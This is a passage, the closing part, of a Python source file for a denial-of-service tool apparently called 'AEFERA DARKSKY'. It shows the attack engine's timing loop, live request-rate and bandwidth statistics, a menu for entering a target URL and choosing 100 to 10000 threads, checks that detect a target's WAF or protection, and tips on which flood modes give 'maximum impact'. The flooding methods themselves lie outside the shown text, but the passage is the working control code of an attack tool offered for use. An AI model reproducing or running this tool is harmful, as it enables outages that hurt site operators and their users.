        stats_thread.start()
        
        # Wait for duration or interrupt
        try:
            end_time = time.time() + self.duration
            while time.time() < end_time and not self.stop_flag:
                time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Attack interrupted by user{Style.RESET_ALL}")
        
        self.stop_attack()
    
    def _safe_attack(self, method_func):
        """Wrapper to catch exceptions and print errors with pretty output"""
        try:
            print(f"{Fore.CYAN}[THREAD]{Style.RESET_ALL} {Fore.GREEN}{threading.current_thread().name}{Style.RESET_ALL} menjalankan {Fore.YELLOW}{method_func.__name__}{Style.RESET_ALL}", flush=True)
            method_func()
        except Exception as e:
            print(f"{Fore.RED}[THREAD ERROR]{Style.RESET_ALL} {Fore.GREEN}{threading.current_thread().name}{Style.RESET_ALL} pada {Fore.YELLOW}{method_func.__name__}{Style.RESET_ALL}: {Fore.WHITE}{e}{Style.RESET_ALL}", flush=True)
    
    def stop_attack(self):
        """Stop all attacks"""
        self.stop_flag = True
        if self.attack_methods:
            self.attack_methods.stop_flag = True
        print(f"\n{Fore.CYAN}[*] Stopping attack...{Style.RESET_ALL}")
        time.sleep(2)
        self._final_stats()
    
    def _display_stats(self):
        """Display real-time stats"""
        while not self.stop_flag:
            elapsed = time.time() - self.start_time
            rps = self.stats['requests'] / max(elapsed, 1)
            mbps = (self.stats['bytes_sent'] * 8) / (1024 * 1024) / max(elapsed, 1)
            remaining = max(0, self.duration - elapsed)
            status = f"\r{Fore.CYAN}[⚡ ATTACK] "
            status += f"{Fore.GREEN}Req: {self.stats['requests']:,} "
            status += f"{Fore.YELLOW}| RPS: {rps:,.0f} "
            status += f"{Fore.MAGENTA}| {mbps:.2f} Mbps "
            status += f"{Fore.RED}| Err: {self.stats['errors']:,} "
            status += f"{Fore.WHITE}| {remaining:.0f}s left "
            status += f"{Style.RESET_ALL}"
            print(status, end='', flush=True)
            time.sleep(0.5)
    
    def _final_stats(self):
        """Display final statistics"""
        elapsed = time.time() - self.start_time
        rps = self.stats['requests'] / max(elapsed, 1)
        total_mb = self.stats['bytes_sent'] / (1024 * 1024)
        total_gb = total_mb / 1024
        
        print(f"\n\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"║{Fore.WHITE}                           ATTACK SUMMARY                                     {Fore.CYAN}║")
        print(f"╠══════════════════════════════════════════════════════════════════════════════╣")
        print(f"║{Fore.GREEN}  Duration          : {Fore.WHITE}{elapsed:.2f} seconds{' ':<46}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  Total Requests    : {Fore.WHITE}{self.stats['requests']:,}{' ':<46}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  Requests/Second   : {Fore.WHITE}{rps:,.0f}{' ':<46}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  Data Sent         : {Fore.WHITE}{total_mb:.2f} MB ({total_gb:.4f} GB){' ':<36}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  Threads Used      : {Fore.WHITE}{self.threads}{' ':<46}{Fore.CYAN}║")
        print(f"║{Fore.GREEN}  Connections       : {Fore.WHITE}{self.stats['connections']:,}{' ':<46}{Fore.CYAN}║")
        print(f"║{Fore.RED}  Errors            : {Fore.WHITE}{self.stats['errors']:,}{' ':<46}{Fore.CYAN}║")
        print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

# ======================= MAIN MENU =======================
def main_menu():
    """Main interactive menu"""
    print_banner()
    
    print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"║{Fore.WHITE}                              MAIN MENU                                       {Fore.CYAN}║")
    print(f"╠══════════════════════════════════════════════════════════════════════════════╣")
    print(f"║  {Fore.GREEN}[1]{Fore.WHITE} Attack Target               - Launch attack on target                   {Fore.CYAN}║")
    print(f"║  {Fore.GREEN}[2]{Fore.WHITE} Analyze Target              - Analyze without attacking                 {Fore.CYAN}║")
    print(f"║  {Fore.GREEN}[3]{Fore.WHITE} Check Protection/WAF        - Detect security measures                  {Fore.CYAN}║")
    print(f"║  {Fore.GREEN}[4]{Fore.WHITE} System Info                 - View system specs & recommendations       {Fore.CYAN}║")
    print(f"║  {Fore.GREEN}[0]{Fore.WHITE} Exit                        - Close program                             {Fore.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    return input(f"\n{Fore.GREEN}[>] Select option: {Style.RESET_ALL}").strip()

def get_target():
    """Get target URL from user"""
    url = input(f"\n{Fore.GREEN}[>] Enter target URL: {Style.RESET_ALL}").strip()
    if not url:
        print(f"{Fore.RED}[!] No URL provided{Style.RESET_ALL}")
        return None
    return url

def get_attack_settings(optimal_threads):
    """Get attack settings from user"""
    print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"║{Fore.WHITE}                           ATTACK SETTINGS                                    {Fore.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    # Threads
    print(f"\n{Fore.YELLOW}[*] Optimal threads for your system: {Fore.WHITE}{optimal_threads}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Min: 100 | Max: 10000 | Recommended: {optimal_threads}{Style.RESET_ALL}")
    threads_input = input(f"{Fore.GREEN}[>] Threads (Enter for optimal {optimal_threads}): {Style.RESET_ALL}").strip()
    
    if threads_input:
        try:
            threads = min(max(int(threads_input), 100), 10000)
        except:
            threads = optimal_threads
    else:
        threads = optimal_threads
    
    # Duration
    print(f"\n{Fore.YELLOW}[*] Attack duration in seconds (default: 60){Style.RESET_ALL}")
    duration_input = input(f"{Fore.GREEN}[>] Duration (Enter for 60s): {Style.RESET_ALL}").strip()
    
    if duration_input:
        try:
            duration = max(int(duration_input), 10)
        except:
            duration = 60
    else:
        duration = 60
    
    return threads, duration

def main():
    """Main function"""
    try:
        while True:
            choice = main_menu()
            
            if choice == '0':
                print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
                print(f"║{Fore.WHITE}                    Thanks for using AEFERA DARKSKY!                          {Fore.CYAN}║")
                print(f"║{Fore.GREEN}                         Coded by: {AUTHOR}                           {Fore.CYAN}║")
                print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
                sys.exit(0)
            
            elif choice == '1':
                # Attack mode
                url = get_target()
                if not url:
                    continue
                
                # Analyze system
                system = SystemAnalyzer()
                optimal = system.display_info()
                
                # Analyze target
                target = TargetAnalyzer(url)
                target_info = target.analyze()
                
                if not target_info or not target_info['ip']:
                    print(f"{Fore.RED}[!] Failed to analyze target{Style.RESET_ALL}")
                    input(f"\n{Fore.GREEN}[>] Press ENTER to continue...{Style.RESET_ALL}")
                    continue
                
                target.display_info()
                
                # Warning if protected
                active_protection = [k for k, v in target_info['protection'].items() if v]
                if active_protection:
                    print(f"\n{Fore.RED}[!] WARNING: Target has protection detected!")
                    print(f"[!] Detected: {', '.join(active_protection)}")
                    print(f"[!] Attack effectiveness may be reduced{Style.RESET_ALL}")
                    cont = input(f"{Fore.YELLOW}[>] Continue anyway? (y/n): {Style.RESET_ALL}").strip().lower()
                    if cont != 'y':
                        continue
                
                # Get settings
                threads, duration = get_attack_settings(optimal)
                
                # Create attack engine
                engine = AttackEngine(target_info, threads, duration)
                method = engine.select_method()
                
                print(f"\n{Fore.RED}[!] WARNING: You are about to attack {target_info['domain']}")
                print(f"[!] This may be illegal without authorization!{Style.RESET_ALL}")
                confirm = input(f"{Fore.YELLOW}[>] Type 'START' to begin attack: {Style.RESET_ALL}").strip()
                
                if confirm.upper() == 'START':
                    engine.start_attack(method)
                else:
                    print(f"{Fore.YELLOW}[*] Attack cancelled{Style.RESET_ALL}")
                
                input(f"\n{Fore.GREEN}[>] Press ENTER to continue...{Style.RESET_ALL}")
            
            elif choice == '2':
                # Analyze only
                url = get_target()
                if not url:
                    continue
                
                target = TargetAnalyzer(url)
                target.analyze()
                target.display_info()
                input(f"\n{Fore.GREEN}[>] Press ENTER to continue...{Style.RESET_ALL}")
            
            elif choice == '3':
                # Check protection
                url = get_target()
                if not url:
                    continue
                
                target = TargetAnalyzer(url)
                if target.resolve_ip():
                    target.detect_protection()
                    
                    print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
                    print(f"║{Fore.WHITE}                        PROTECTION ANALYSIS                                   {Fore.CYAN}║")
                    print(f"╠══════════════════════════════════════════════════════════════════════════════╣")
                    print(f"║{Fore.GREEN}  Target: {Fore.WHITE}{target.domain:<67}{Fore.CYAN}║")
                    print(f"║{Fore.GREEN}  IP:     {Fore.WHITE}{target.ip:<67}{Fore.CYAN}║")
                    print(f"╠══════════════════════════════════════════════════════════════════════════════╣")
                    
                    for protection, detected in target.protection.items():
                        if detected:
                            print(f"║  {Fore.RED}[DETECTED]{Fore.WHITE} {protection.upper():<63}{Fore.CYAN}║")
                        else:
                            print(f"║  {Fore.GREEN}[  CLEAR ]{Fore.WHITE} {protection.upper():<63}{Fore.CYAN}║")
                    
                    print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
                
                input(f"\n{Fore.GREEN}[>] Press ENTER to continue...{Style.RESET_ALL}")
            
            elif choice == '4':
                # System info
                system = SystemAnalyzer()
                optimal = system.display_info()
                
                print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
                print(f"║{Fore.WHITE}                        RECOMMENDED METHODS                                   {Fore.CYAN}║")
                print(f"╠══════════════════════════════════════════════════════════════════════════════╣")
                
                methods = system.get_recommended_methods()
                for i, method in enumerate(methods, 1):
                    print(f"║  {Fore.GREEN}{i:>2}. {Fore.WHITE}{method:<71}{Fore.CYAN}║")
                
                print(f"╠══════════════════════════════════════════════════════════════════════════════╣")
                print(f"║{Fore.YELLOW}  TIP: Use MIXED_L7 for web servers, MIXED_L4 for raw network attack          {Fore.CYAN}║")
                print(f"║{Fore.YELLOW}  TIP: ALL_OUT combines everything for maximum impact                         {Fore.CYAN}║")
                print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
                
                input(f"\n{Fore.GREEN}[>] Press ENTER to continue...{Style.RESET_ALL}")
            
            else:
                print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
    
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[*] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)

if __name__ == "__main__":
    main()
